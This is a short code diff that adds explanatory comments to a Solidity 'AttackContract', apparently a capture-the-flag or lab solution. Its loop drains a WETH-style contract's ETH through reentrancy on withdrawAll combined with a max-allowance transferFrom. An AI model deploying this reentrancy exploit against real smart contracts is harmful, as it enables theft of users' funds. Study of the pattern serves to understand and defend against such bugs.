@@ -33,11 +33,18 @@ contract AttackContract {
         while (address(weth).balance > 0) {
             // Choose the smaller one from `address(this).balance` and `address(weth).balance`
             uint256 amount = address(this).balance < address(weth).balance ? address(this).balance : address(weth).balance;
+            // ETH -> WETH in order to "warm up" the attack
             weth.deposit{value: amount}();
+
             isDone = false;
+            // Trigger the "reentrancy" thing
             weth.withdrawAll();
             isDone = true;
+
+            // Take out the WETH we gave to the weth pool during fallback
+            // We can do this because we have max allowance
             weth.transferFrom(address(weth), address(this), amount);
+            // WETH -> ETH legitimately without triggering the logic in fallback
             weth.withdrawAll();
         }
 
